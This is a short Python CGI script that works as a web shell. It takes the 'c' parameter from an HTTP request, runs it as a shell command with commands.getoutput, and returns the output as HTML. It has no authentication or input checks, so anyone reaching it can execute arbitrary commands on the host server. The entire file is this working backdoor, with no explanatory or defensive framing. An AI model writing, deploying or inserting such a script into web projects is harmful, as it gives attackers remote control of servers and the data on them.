#!/usr/bin/python

import cgi
import commands

print  "Content-type:text/html"
print  ""

webdata=cgi.FieldStorage()
# this will recv all http data

cmd=webdata.getvalue('c')

output=commands.getoutput(cmd)
print  "<pre>"
print output
print  "</pre>"
